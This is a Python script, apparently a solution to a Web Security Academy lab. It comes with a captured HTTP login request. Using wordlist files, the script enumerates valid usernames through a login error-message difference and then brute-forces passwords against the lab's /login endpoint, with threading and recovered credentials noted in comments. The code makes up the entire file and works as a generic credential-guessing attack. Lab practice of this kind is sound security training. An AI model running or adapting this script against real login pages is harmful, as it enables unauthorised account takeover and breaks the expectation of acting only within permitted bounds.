'''
POST /login HTTP/2
Host: 0a2c001d030384de8132d9d400b1004f.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: https://0a2c001d030384de8132d9d400b1004f.web-security-academy.net
Connection: keep-alive
Referer: https://0a2c001d030384de8132d9d400b1004f.web-security-academy.net/login
Cookie: session=gzNRSyyzSwYhaJr5MXpxuugkdWhdhTDr
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

username=sdf
password=sdf
'''

import requests
import bs4
import threading
import time

DOMAIN = "0a2c001d030384de8132d9d400b1004f.web-security-academy.net"

with open("usernames.dic", "r") as f:
    USERNAMES_DIC = f.readlines()

with open("passwords.dic", "r") as f:
    PASSWORDS_DIC = f.readlines()

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

COOKIES = {
    "session": "gzNRSyyzSwYhaJr5MXpxuugkdWhdhTDr"
}

def login(username, password):
    url = f"https://{DOMAIN}/login"
    data = {
        "username": username,
        "password": password
    }
    res = requests.post(url, headers=HEADERS, cookies=COOKIES, data=data, allow_redirects=False)

    # print(f"Username: {username}, Password: {password}, Status: {res.status_code}, Length: {len(res.text)}")
    return res

def enum_usernames(DIC=USERNAMES_DIC):
    usernames = []

    for username in DIC:
        username = username.strip()
        res = login(username, username)
        if 'Invalid username or password.' not in res.text:
            usernames.append(username)
            print(f"Username: {username}")

    return usernames

def brute_force_passwords(username, DIC=PASSWORDS_DIC):
    print(f"Brute forcing passwords for username: {username}")
    for password in DIC:
        password = password.strip()
        res = login(username, password)
        if 'Invalid username or password' not in res.text:
            print(f"Username: {username}, Password: {password}")
            print(res.text)
            return password

    return None

def multi_thread_enum_usernames():
    t1 = threading.Thread(target=enum_usernames, args=(USERNAMES_DIC[:len(USERNAMES_DIC)//2],))
    t2 = threading.Thread(target=enum_usernames, args=(USERNAMES_DIC[len(USERNAMES_DIC)//2:],))

    t1.start()
    t2.start()

    t1.join()
    t2.join()    




# multi_thread_enum_usernames() # alerts
brute_force_passwords("alerts") # george